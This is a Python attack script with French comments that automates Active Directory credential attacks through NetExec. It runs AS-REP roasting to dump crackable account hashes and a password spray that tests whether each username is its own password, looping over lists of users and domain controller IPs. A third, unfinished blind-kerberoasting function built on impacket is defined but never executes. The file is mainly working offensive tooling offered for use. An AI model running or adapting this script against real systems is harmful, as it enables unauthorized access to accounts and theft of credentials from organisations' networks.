import subprocess
import os
from colorama import Fore, Back, Style, init


init()

######### FONCTIONS ESSENTIELLES ###########

# Exécute une commande en subprocess
def run_command(command):
    try:
        result = subprocess.run(command, shell=False,capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return f"Erreur: {result.stderr.strip()}"
    except Exception as e:
        return f"Erreur : {e}"
        
        
# Permet de lire un fichier et retourner une liste de lignes non vides
def read_file(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except Exception as e:
        print(f"Error reading {file_path} : {e}")
        return []
        
        
        
# Vérifie si une entrée est un fichier, sinon la considère comme une valeur unique
def get_input_or_file(input_value):
    if os.path.isfile(input_value):  
        return read_file(input_value)
    return [input_value]  
    







######### MODULES ###########

# Module ASREPRoast avec NetExec
def nxc_asreproast(dc_ip, user, output_file):
    asreproast = [
        "nxc",
        "ldap",
        dc_ip,
        "-u",
        user,
        "-p", 
        "",  
        "--asreproast",
        output_file  
    ]
    return run_command(asreproast)

# Teste si user == password avec NetExec
def nxc_spray(dc_ip, user, password):
    spraying = [
        "nxc",
        "smb",
        dc_ip,
        "-u",
        user,
        "-p",
        password,
        "--no-bruteforce",
        "--continue-on-success"
    ]
    return run_command(spraying)
    
#impacket blind kerberoasting

def imp_bkrb(dc_ip,user,user_list,domain):
    blind_krbrs = [
        "impacket-GetUserSPNs",
        "-no-preauth",
        user,
        "-usersfile",
        user_list,
        "-dc-host",
        dc_ip,
        "domain"
    ]
    
    

######### INTERFACE UTILISATEUR ##########

if __name__ == "__main__":
    print(Fore.BLUE + "🔥 MODULE VALID USER (NO PASSWORD) 🔥\n" + Style.RESET_ALL)

    # Demande le username ou un fichier de usernames
    user_input = input("User : ").strip()
    user_list = get_input_or_file(user_input)
    
    

    # Demande l'IP ou un fichier de plusieurs IPs
    ip_input = input("IP : ").strip()
    ip_list = get_input_or_file(ip_input)
    
    

    # Demande quelle attaque lancer
    print("\n🔹 Tasks :")
    print("  1 ASREPRoast\n")
    print("  2 Password Spray (user == password)\n")
    print("  3 Both\n")
    attack_choice = input("Your choice (1/2/3) ? ").strip()

    if attack_choice not in ["1", "2", "3"]:
        print("❌ Invalid choice. Exiting")
        exit()

    # Lancement des attaques
    for dc_ip in ip_list:
        for user in user_list:
            print(f"\n🟡 Testing {user} on {dc_ip}...")

            if attack_choice in ["1", "3"]:
                output_file = f"{user}_asreproast.txt"
                asreproast_result = nxc_asreproast(dc_ip, user, output_file)
                print(f"[ASREPROAST] {user}@{dc_ip} → {asreproast_result}\n")

            if attack_choice in ["2", "3"]:
                spray_result = nxc_spray(dc_ip, user, user) 
                print(f"[SPRAY] {user}:{user}@{dc_ip} → {spray_result}")
                if "[+]" in spray_result:
                	print(Fore.GREEN + f"[SPRAY] {user}:{user}@{dc_ip} => ✅ VALID" + Style.RESET_ALL)

            print("-" * 50) 

    print("\n✅ Done !")

